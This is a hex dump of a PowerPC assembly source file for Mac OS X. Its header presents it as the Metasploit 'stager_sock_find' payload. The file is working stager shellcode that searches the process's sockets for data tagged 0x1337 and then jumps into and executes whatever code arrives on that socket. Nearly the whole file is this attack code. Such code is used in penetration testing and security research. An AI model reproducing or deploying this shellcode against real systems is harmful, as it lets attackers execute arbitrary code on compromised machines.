00000000  3b 3b 0d 0a 3b 0d 0a 3b  20 20 20 20 20 20 20 20  |;;..;..;        |
00000010  4e 61 6d 65 3a 20 73 74  61 67 65 72 5f 73 6f 63  |Name: stager_soc|
00000020  6b 5f 66 69 6e 64 0d 0a  3b 20 20 20 51 75 61 6c  |k_find..;   Qual|
00000030  69 74 69 65 73 3a 20 43  61 6e 20 48 61 76 65 20  |ities: Can Have |
00000040  4e 75 6c 6c 73 0d 0a 3b  20 20 20 50 6c 61 74 66  |Nulls..;   Platf|
00000050  6f 72 6d 73 3a 20 4d 61  63 4f 53 20 58 20 2f 20  |orms: MacOS X / |
00000060  50 50 43 0d 0a 3b 20 20  20 20 20 41 75 74 68 6f  |PPC..;     Autho|
00000070  72 73 3a 20 48 20 44 20  4d 6f 6f 72 65 20 3c 20  |rs: H D Moore < |
00000080  68 64 6d 20 5b 61 74 5d  20 6d 65 74 61 73 70 6c  |hdm [at] metaspl|
00000090  6f 69 74 2e 63 6f 6d 20  3e 0d 0a 3b 20 20 20 20  |oit.com >..;    |
000000a0  20 56 65 72 73 69 6f 6e  3a 20 24 52 65 76 69 73  | Version: $Revis|
000000b0  69 6f 6e 3a 20 31 2e 31  20 24 0d 0a 3b 20 20 20  |ion: 1.1 $..;   |
000000c0  20 20 4c 69 63 65 6e 73  65 3a 0d 0a 3b 0d 0a 3b  |  License:..;..;|
000000d0  20 20 20 20 20 20 20 20  54 68 69 73 20 66 69 6c  |        This fil|
000000e0  65 20 69 73 20 70 61 72  74 20 6f 66 20 74 68 65  |e is part of the|
000000f0  20 4d 65 74 61 73 70 6c  6f 69 74 20 45 78 70 6c  | Metasploit Expl|
00000100  6f 69 74 20 46 72 61 6d  65 77 6f 72 6b 0d 0a 3b  |oit Framework..;|
00000110  20 20 20 20 20 20 20 20  61 6e 64 20 69 73 20 73  |        and is s|
00000120  75 62 6a 65 63 74 20 74  6f 20 74 68 65 20 73 61  |ubject to the sa|
00000130  6d 65 20 6c 69 63 65 6e  73 65 73 20 61 6e 64 20  |me licenses and |
00000140  63 6f 70 79 72 69 67 68  74 73 20 61 73 0d 0a 3b  |copyrights as..;|
00000150  20 20 20 20 20 20 20 20  74 68 65 20 72 65 73 74  |        the rest|
00000160  20 6f 66 20 74 68 69 73  20 70 61 63 6b 61 67 65  | of this package|
00000170  2e 0d 0a 3b 0d 0a 3b 20  44 65 73 63 72 69 70 74  |...;..; Descript|
00000180  69 6f 6e 3a 0d 0a 3b 0d  0a 3b 20 20 20 20 20 20  |ion:..;..;      |
00000190  20 20 54 68 69 73 20 70  61 79 6c 6f 61 64 20 77  |  This payload w|
000001a0  69 6c 6c 20 72 65 63 76  28 29 20 64 6f 77 6e 77  |ill recv() downw|
000001b0  61 72 64 20 75 6e 74 69  6c 20 74 68 65 20 72 65  |ard until the re|
000001c0  61 64 0d 0a 3b 20 20 20  20 20 20 20 20 64 61 74  |ad..;        dat|
000001d0  61 20 63 6f 6e 74 61 69  6e 73 20 74 68 65 20 73  |a contains the s|
000001e0  65 61 72 63 68 20 74 61  67 20 28 30 78 58 58 58  |earch tag (0xXXX|
000001f0  58 31 33 33 37 29 2e 20  4f 6e 63 65 20 74 68 65  |X1337). Once the|
00000200  0d 0a 3b 20 20 20 20 20  20 20 20 74 61 67 20 69  |..;        tag i|
00000210  73 20 6c 6f 63 61 74 65  64 2c 20 69 74 20 77 69  |s located, it wi|
00000220  6c 6c 20 6a 75 6d 70 20  69 6e 74 6f 20 74 68 65  |ll jump into the|
00000230  20 70 61 79 6c 6f 61 64  2e 0d 0a 3b 0d 0a 3b 3b  | payload...;..;;|
00000240  0d 0a 0d 0a 2e 67 6c 6f  62 6c 20 5f 6d 61 69 6e  |.....globl _main|
00000250  0d 0a 2e 74 65 78 74 0d  0a 5f 6d 61 69 6e 3a 0d  |...text.._main:.|
00000260  0a 09 6c 69 20 09 72 32  39 2c 20 30 78 66 66 66  |..li .r29, 0xfff|
00000270  0d 0a 09 6c 69 09 72 33  30 2c 20 30 78 66 66 66  |...li.r30, 0xfff|
00000280  0d 0a 09 61 64 64 69 63  2e 09 72 32 38 2c 20 72  |...addic..r28, r|
00000290  32 39 2c 20 2d 30 78 66  66 66 20 2b 31 0d 0a 0d  |29, -0xfff +1...|
000002a0  0a 66 69 6e 64 73 6f 63  6b 3a 0d 0a 09 73 75 62  |.findsock:...sub|
000002b0  66 2e 20 20 20 72 33 30  2c 20 72 32 38 2c 20 72  |f.   r30, r28, r|
000002c0  33 30 0d 0a 09 62 6c 74  09 5f 6d 61 69 6e 0d 0a  |30...blt._main..|
000002d0  0d 0a 09 73 75 62 69 09  72 30 2c 20 72 32 39 2c  |...subi.r0, r29,|
000002e0  20 30 78 66 66 66 20 2d  20 31 30 32 0d 0a 09 6d  | 0xfff - 102...m|
000002f0  72 09 72 33 2c 20 72 33  30 0d 0a 09 73 75 62 69  |r.r3, r30...subi|
00000300  09 72 34 2c 20 72 31 2c  20 34 31 30 34 0d 0a 09  |.r4, r1, 4104...|
00000310  6c 69 20 09 72 35 2c 20  34 30 39 35 0d 0a 09 73  |li .r5, 4095...s|
00000320  75 62 69 20 20 20 20 72  36 2c 20 72 32 39 2c 20  |ubi    r6, r29, |
00000330  30 78 66 66 66 20 2d 20  30 78 38 30 0d 0a 09 2e  |0xfff - 0x80....|
00000340  6c 6f 6e 67 20 20 20 30  78 34 34 66 66 66 66 30  |long   0x44ffff0|
00000350  32 0d 0a 09 78 6f 72 2e  09 72 36 2c 20 72 36 2c  |2...xor..r6, r6,|
00000360  20 72 36 0d 0a 09 0d 0a  09 6c 68 7a 09 72 32 37  | r6......lhz.r27|
00000370  2c 20 2d 34 31 30 34 28  72 31 29 0d 0a 09 63 6d  |, -4104(r1)...cm|
00000380  70 77 69 09 72 32 37 2c  20 30 78 31 33 33 37 0d  |pwi.r27, 0x1337.|
00000390  0a 09 62 6e 65 09 66 69  6e 64 73 6f 63 6b 0d 0a  |..bne.findsock..|
000003a0  0d 0a 67 6f 74 73 6f 63  6b 3a 0d 0a 09 73 75 62  |..gotsock:...sub|
000003b0  69 09 72 34 2c 20 72 31  2c 20 34 31 30 30 0d 0a  |i.r4, r1, 4100..|
000003c0  09 6d 74 63 74 72 09 72  34 0d 0a 09 62 6c 65 63  |.mtctr.r4...blec|
000003d0  74 72 09 0d 0a 09 78 6f  72 2e 09 72 36 2c 20 72  |tr....xor..r6, r|
000003e0  36 2c 20 72 36                                    |6, r6|
000003e5
